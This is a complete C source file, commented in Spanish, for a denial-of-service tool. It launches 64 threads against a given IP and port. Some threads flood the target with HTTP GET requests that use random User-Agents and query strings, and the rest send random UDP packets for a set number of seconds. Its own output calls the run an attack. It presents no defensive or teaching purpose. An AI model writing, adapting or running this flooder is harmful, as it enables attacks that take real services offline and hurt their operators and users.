#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/sysinfo.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h> // Para non-blocking sockets
#include <errno.h> // Para el manejo de errores de sockets

#define THREADS 64
#define MAX_HTTP_REQS 4 // Reduce para no saturar tan rápido
#define MAX_UDP_PACKETS 5 // Reduce el número de paquetes UDP
#define USER_AGENT_COUNT 5  // Número de User-Agents
#define RETRY_DELAY_MS 200  // Tiempo de espera antes de reintentar conexión/envío
#define IP_ROTATION_INTERVAL 60 // Rotar la dirección IP cada 60 segundos
#define ERROR_REPORT_INTERVAL 10 // Reportar errores cada 10 intentos

volatile sig_atomic_t running = 1;

typedef struct {
    char *ip;
    int port;
    int thread_id; // Identificador para cada hilo
    long long packets_sent; // Contador de paquetes enviados
    int error_count; // Contador de errores para limitar los mensajes
} target_info;

// Array de User-Agents
const char *user_agents[USER_AGENT_COUNT] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"
};

void sig_handler(int signo) {
    running = 0;
    printf("Señal recibida. Terminando...\n");
}

// Función para obtener un User-Agent aleatorio
const char *get_random_user_agent() {
    return user_agents[rand() % USER_AGENT_COUNT];
}

// Función para configurar un socket como non-blocking
int set_non_blocking(int sockfd) {
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl(F_GETFL)");
        return -1;
    }

    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
        perror("fcntl(F_SETFL)");
        return -1;
    }
    return 0;
}

// Estructura para guardar el buffer de la respuesta HTTP.
typedef struct {
    char buffer[4096];
    size_t size;
} HttpResponse;

// Funcion para leer la respuesta completa del servidor.
int receive_full_response(int sockfd, HttpResponse *response) {
    ssize_t bytes_received;
    while (running) {
        bytes_received = recv(sockfd, response->buffer + response->size, sizeof(response->buffer) - response->size, 0);
        if (bytes_received == -1) {
            if (errno == EWOULDBLOCK || errno == EAGAIN) {
                // No hay datos disponibles temporalmente, esperar y reintentar.
                usleep(10000); // Esperar 10ms
                continue;
            } else {
                perror("recv");
                return -1; // Error en la recepción
            }
        } else if (bytes_received == 0) {
            // Conexión cerrada por el servidor
            break;
        } else {
            response->size += bytes_received;
            if (response->size >= sizeof(response->buffer)) {
                // Buffer lleno, posible ataque DoS, salir.
                fprintf(stderr, "Error: Buffer de respuesta HTTP lleno, posible ataque DoS.\n");
                return -1;
            }
            // Comprobar si hemos recibido todos los encabezados (fin de encabezados \r\n\r\n)
            if (strstr(response->buffer, "\r\n\r\n") != NULL) {
                break; // Se han recibido todos los encabezados
            }
        }
    }
    return 0; // Recepción exitosa (o conexión cerrada)
}

void* http_flood(void* arg) {
    target_info *t = (target_info*)arg;
    char http_get[512]; // Aumentar el tamaño del buffer
    HttpResponse response; // Estructura para almacenar la respuesta
    response.size = 0;
    int retry_count = 0;
    const int max_retries = 5;  // Máximo número de reintentos

    while (running) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            t->error_count++;
            if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                fprintf(stderr, "Hilo %d: Error al crear socket (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
            }
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }
        t->error_count = 0; // Resetear el contador de errores al crear el socket

        if (set_non_blocking(sockfd) == -1) {
            t->error_count++;
            if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                fprintf(stderr, "Hilo %d: Error al configurar socket no bloqueante (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
            }
            close(sockfd);
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }
        t->error_count = 0;

        int opt = 1;
        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        struct timeval timeout;
        timeout.tv_sec = 5; // Aumentar el timeout
        timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)); // Añadir timeout de recepción

        struct sockaddr_in target;
        memset(&target, 0, sizeof(target));
        target.sin_family = AF_INET;
        target.sin_port = htons(t->port);
        if (inet_pton(AF_INET, t->ip, &target.sin_addr) <= 0) {
            t->error_count++;
            if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                fprintf(stderr, "Hilo %d: Error en inet_pton (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
            }
            close(sockfd);
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }
        t->error_count = 0;

        // Conectar con timeout
        if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) != 0) {
            if (errno == EINPROGRESS) {
                fd_set writefds;
                FD_ZERO(&writefds);
                FD_SET(sockfd, &writefds);
                struct timeval tv;
                tv.tv_sec = timeout.tv_sec;
                tv.tv_usec = timeout.tv_usec;

                int retval = select(sockfd + 1, NULL, &writefds, NULL, &tv);
                if (retval == 0) {
                    t->error_count++;
                    if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                        fprintf(stderr, "Hilo %d: Timeout al conectar (%d intentos).\n", t->thread_id, t->error_count);
                    }
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                } else if (retval == -1) {
                    t->error_count++;
                    if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                        fprintf(stderr, "Hilo %d: Error en select (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
                    }
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                }
                // Comprobar si hay un error pendiente en el socket
                int error;
                socklen_t len = sizeof(error);
                if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, &len) == -1 || error != 0) {
                    t->error_count++;
                    if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                        fprintf(stderr, "Hilo %d: Error al conectar después de select (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
                    }
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                }
            } else {
                t->error_count++;
                if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                    fprintf(stderr, "Hilo %d: Error al conectar (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
                }
                close(sockfd);
                usleep(RETRY_DELAY_MS * 1000);
                continue;
            }
        }
        t->error_count = 0;

        // Generar la petición HTTP con User-Agent aleatorio
        snprintf(http_get, sizeof(http_get),
                 "GET /?%d HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: */*\r\n"
                 "Connection: keep-alive\r\n\r\n",
                 rand(), t->ip, get_random_user_agent());

        for (int i = 0; i < MAX_HTTP_REQS && running; i++) {
            ssize_t bytes_sent = send(sockfd, http_get, strlen(http_get), 0);
            if (bytes_sent < 0) {
                t->error_count++;
                if (t->error_count % ERROR_REPORT_INTERVAL == 0) {
                    fprintf(stderr, "Hilo %d: Error al enviar datos (%d intentos): %s\n", t->thread_id, t->error_count, strerror(errno));
                }
                break; // Salir del bucle si falla el envío
            }
            t->packets_sent++;
            // Leer la respuesta HTTP
            response.size = 0; // Resetear el tamaño de la respuesta.
            if (receive_full_response(sockfd, &response) != 0) {
                // Si falla la recepción, salir del bucle.
                break;
            }
            usleep(50000);
        }
        close(sockfd);
        usleep(10000);
    }
    printf("Hilo HTTP %d terminado. Paquetes enviados: %lld\n", t->thread_id, t->packets_sent);
    return NULL;
}

void* udp_mix(void* arg) {
    target_info *t = (target_info*)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Hilo %d: Error al crear socket UDP: %s\n", t->thread_id, strerror(errno));
        return NULL;
    }

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(t->port);
    if (inet_pton(AF_INET, t->ip, &target.sin_addr) <= 0) {
        fprintf(stderr, "Hilo %d: Error en inet_pton (UDP): %s\n", t->thread_id, strerror(errno));
        close(sockfd);
        return NULL;
    }

    char buffer[512];

    while (running) {
        for (int i = 0; i < MAX_UDP_PACKETS && running; i++) {
            memset(buffer, rand() % 256, sizeof(buffer));
            ssize_t bytes_sent = sendto(sockfd, buffer, rand() % 512 + 1, 0,
                                       (struct sockaddr*)&target, sizeof(target));
            if (bytes_sent < 0) {
                fprintf(stderr, "Hilo %d: Error al enviar datos UDP: %s\n", t->thread_id, strerror(errno));
                break;
            }
            t->packets_sent++;
            usleep(1000); // Reducir la velocidad de envío
        }
        usleep(1000);
    }

    close(sockfd);
    printf("Hilo UDP %d terminado. Paquetes enviados: %lld\n", t->thread_id, t->packets_sent);
    return NULL;
}

void* cpu_regulator(void* arg) {
    long prev_idle = 0, prev_total = 0;

    while (running) {
        FILE* stat = fopen("/proc/stat", "r");
        if (stat) {
            char cpu[10];
            long user, nice, system, idle, iowait, irq, softirq, steal;
            int scanned = fscanf(stat, "%s %ld %ld %ld %ld %ld %ld %ld %ld",
                                 cpu, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal);
            fclose(stat);

            if (scanned == 9) {
                long total = user + nice + system + idle + iowait + irq + softirq + steal;
                long idle_diff = idle - prev_idle;
                long total_diff = total - prev_total;

                if (prev_total > 0 && total_diff > 0) {
                    float cpu_usage = 100.0 * (1.0 - ((float)idle_diff / total_diff));

                    if (cpu_usage > 88.0) {
                        usleep(300000); // Reduce el uso de CPU
                    } else if (cpu_usage < 75.0) {
                        usleep(5000); // Aumenta el uso de CPU
                    }
                }

                prev_idle = idle;
                prev_total = total;
            }
        }

        sleep(1);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <IP> <PUERTO> <SEGUNDOS>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGPIPE, SIG_IGN); // Ignorar SIGPIPE para evitar la terminación del programa

    srand(time(NULL));

    target_info t[THREADS]; // Array de estructuras target_info para cada hilo
    char *ip_address = argv[1];
    int port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);

    pthread_t threads[THREADS];
    pthread_t regulator;

    // Inicializar el array de estructuras e iniciar los hilos
    for (int i = 0; i < THREADS; i++) {
        t[i].ip = ip_address;
        t[i].port = port;
        t[i].thread_id = i; // Asignar un ID único
        t[i].packets_sent = 0;
        t[i].error_count = 0; // Inicializar el contador de errores
        if (i % 3 == 0) {
            pthread_create(&threads[i], NULL, http_flood, &t[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_mix, &t[i]);
        }
        usleep(1000);
    }

    pthread_create(&regulator, NULL, cpu_regulator, NULL);

    printf("Ataque iniciado contra %s:%d durante %d segundos...\n", ip_address, port, attack_time);
    for (int i = 0; i < attack_time && running; i++) {
        sleep(1);
        if ((i + 1) % 60 == 0) {
           printf("Han pasado %d segundos...\n", i + 1);
        }
    }

    running = 0;
    printf("Deteniendo los hilos...\n");
    usleep(100000);

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
        printf("Hilo %d terminado.\n", i);
    }
    pthread_join(regulator, NULL);
    printf("Regulador de CPU terminado.\n");

    printf("Ataque finalizado.\n");
    return 0;
}
